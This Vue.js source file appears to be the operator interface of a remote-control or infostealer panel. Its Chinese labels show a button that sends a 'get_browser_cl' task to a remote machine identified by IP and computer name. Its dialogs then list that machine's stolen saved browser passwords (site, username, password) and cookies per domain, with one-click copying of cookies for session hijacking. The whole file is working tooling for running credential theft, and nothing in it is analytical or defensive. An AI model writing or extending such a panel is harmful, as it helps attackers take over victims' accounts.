<template>
  <el-dialog
    v-loading="browserLCLoading"
    element-loading-background="rgba(0, 0, 0, 0.5)"
    title="浏览器列表"
    width="70%"
    top="10vh"
    :visible.sync="blcdata.browserLCVisible"
    @close="browserLCClose"
  >
    <div slot="title">
      {{ blcdata.ip }} — 浏览器列表
    </div>
    <div>
      <el-button type="primary" icon="el-icon-refresh" plain @click="sendBrowserLC">获取浏览器表单密码/Cookies</el-button>
    </div>
    <br>
    <el-table
      :data="browserLCData"
      height="400px"
      max-height="400px"
      border
      row-key="id"
      lazy
      :load="loadBrowser"
      :tree-props="{ hasChildren: 'hasChildren'}"
    >
      <el-table-column prop="id" label="ID" width="100"></el-table-column>
      <el-table-column prop="user" label="计算机名" width="200"></el-table-column>
      <el-table-column prop="browser" label="浏览器" :show-overflow-tooltip="true" min-width="50%"></el-table-column>
      <el-table-column prop="update_time" label="获取时间" min-width="50%"></el-table-column>
      <el-table-column label="操作" align="center" width="240">
        <template v-if="row.browser !== '浏览器'" slot-scope="{row}">
          <el-button type="success" size="mini" plain @click="seeLoginData(row)">查看密码</el-button>
          <el-button type="warning" size="mini" plain @click="seeCookies(row)">查看Cookies</el-button>
        </template>
      </el-table-column>
    </el-table>
    <!-- 查看密码 -->
    <el-dialog
      v-loading="seeLoginDataLoading"
      element-loading-background="rgba(0, 0, 0, 0.5)"
      title="查看浏览器表单密码"
      width="60%"
      top="10vh"
      append-to-body
      :visible.sync="seeLoginDataVisible"
      @close="seeLoginDataClose"
    >
      <div slot="title">
        {{ browserName }} — 表单密码
      </div>
      <br>
      <el-table
        :data="browserLoginData"
        height="400px"
        max-height="400px"
        border
      >
        <el-table-column label="网址" :show-overflow-tooltip="true" min-width="50%">
          <template slot-scope="{row}">
            <el-link type="primary" :href="row.url" target="_blank" :underline="false">{{ row.url }}</el-link>
          </template>
        </el-table-column>
        <el-table-column prop="username" label="用户名" width="200"></el-table-column>
        <el-table-column prop="password" label="密码" width="200"></el-table-column>
        <el-table-column prop="time" label="保存时间" width="180"></el-table-column>
      </el-table>
    </el-dialog>
    <!-- 查看Cookies -->
    <el-dialog
      v-loading="seeCookiesLoading"
      element-loading-background="rgba(0, 0, 0, 0.5)"
      title="查看浏览器Cookies"
      width="60%"
      top="10vh"
      append-to-body
      :visible.sync="seeCookiesVisible"
      @close="seeCookiesClose"
    >
      <div slot="title">
        {{ browserName }} — Cookies
      </div>
      <br>
      <el-table
        :data="browserCookiesData.filter(searchData => searchData.domain.toLowerCase().includes(search.toLowerCase()))"
        height="400px"
        max-height="400px"
        border
      >
        <el-table-column prop="domain" label="域名" :show-overflow-tooltip="true" width="200">
          <template slot="header" slot-scope="{}">
            <el-input
              v-model="search"
              size="mini"
              placeholder="域名搜索"
            />
          </template>
        </el-table-column>
        <el-table-column prop="cookies" label="Cookies(双击可复制)" :show-overflow-tooltip="true" min-width="60%">
          <template slot-scope="{row}">
            <span @dblclick="copyCookies(row)">{{ row.cookies }}</span>
          </template>
        </el-table-column>
        <el-table-column prop="time" label="保存时间" width="180"></el-table-column>
      </el-table>
    </el-dialog>
  </el-dialog>
</template>

<script>
import { submitTask, getBrowserLC } from '@/api/consoleApi'
import { getToken } from '@/utils/auth'
export default {
  name: 'BrowserLC',
  props: {
    blcdata: {
      type: Object,
      default: () => {}
    }
  },
  data() {
    return {
      browserLCLoading: false,
      timer: '',
      browserLCData: [],
      browserName: '',
      browserLoginData: [],
      seeLoginDataVisible: false,
      seeLoginDataLoading: false,
      browserCookiesData: [],
      seeCookiesVisible: false,
      seeCookiesLoading: false,
      search: ''
    }
  },
  watch: {
    blcdata: {
      handler: function(data) {
        if (data.browserLCVisible === true) {
          this.browserLCLoading = true
          this.init(data)
        }
      },
      deep: true
    }
  },
  methods: {
    // 获取浏览器
    init(val) {
      this.browserLCLoading = true
      const data = {
        'token': getToken(),
        'key': val.key
      }
      getBrowserLC(data).then(response => {
        if (response.code === 20000 && response.status === true) {
          this.browserLCData = response.data
          // clearInterval(this.timer)
        } else {
          this.$message({
            message: response.msg,
            type: 'error'
          })
        }
        this.browserLCLoading = false
      })
    },
    // 发送获取浏览器指令
    sendBrowserLC() {
      const data = {
        'key': this.blcdata.key,
        'content': 'get_browser_cl',
        'type': 'get_browser_cl',
        'token': getToken()
      }
      // 提交
      submitTask(data).then(response => {
        if (response.code === 20000) {
          this.$notify.success({
            title: 'info',
            message: '获取浏览器密码/Cookies发送成功!!',
            duration: 2000,
            showClose: false
          })
          this.browserLCData = []
          this.browserLCLoading = true
          // 多次提交，保留一个定时器
          clearInterval(this.timer)
          this.timer = setInterval(() => {
            this.init(data)
          }, 3000)
        }
      })
    },
    // 关闭
    browserLCClose() {
      clearInterval(this.timer)
      this.browserLCData = []
      this.blcdata.browserLCVisible = false
    },
    // 格式化时间戳
    // formatTime(row) {
    //   return parseTime(row.update_time)
    // },
    // 加载树形浏览器信息
    loadBrowser(tree, treeNode, resolve) {
      const browserList = []
      for (var index in tree) {
        if (typeof (tree[index]) === 'object') {
          var temp = {
            'id': tree.id + '-' + index,
            'user': tree[index]['user'],
            'browser': tree[index]['browser'],
            'update_time': tree.update_time,
            'login_data': tree[index]['Login_Data'],
            'cookies': tree[index]['Cookies']
          }
          browserList.push(temp)
        }
      }
      setTimeout(() => {
        resolve(browserList)
      }, 300)
    },
    // 查看密码
    seeLoginData(row) {
      this.seeLoginDataVisible = true
      this.seeLoginDataLoading = true
      this.browserName = row['id'].substring(0, row['id'].indexOf('-')) + ' — ' + row['browser']
      var login_data = row['login_data']
      if (login_data['status'] === true) {
        this.browserLoginData = login_data['data']
      } else {
        this.$message({
          message: login_data['msg'],
          type: 'error'
        })
      }
      this.seeLoginDataLoading = false
    },
    // 查看Cookies
    seeCookies(row) {
      this.seeCookiesVisible = true
      this.seeCookiesLoading = true
      this.browserName = row['id'].substring(0, row['id'].indexOf('-')) + ' — ' + row['browser']
      var cookies = row['cookies']
      if (cookies['status'] === true) {
        this.browserCookiesData = cookies['data']
      } else {
        this.$message({
          message: cookies['msg'],
          type: 'error'
        })
      }
      this.seeCookiesLoading = false
    },
    // 关闭查看密码
    seeLoginDataClose() {
      this.browserLoginData = []
      this.seeLoginDataVisible = false
    },
    // 关闭查看cookies
    seeCookiesClose() {
      this.browserCookiesData = []
      this.seeCookiesVisible = false
    },
    // 复制Cookies
    copyCookies(row) {
      const _this = this
      this.$copyText(row.cookies).then(function(e) {
        _this.$message({
          message: '复制成功',
          type: 'success',
          duration: 2000
        })
      }, function(e) {
        _this.$message({
          message: '复制失败，请手动复制',
          type: 'error',
          duration: 2000
        })
      })
    }
  }
}
</script>

<style>
</style>
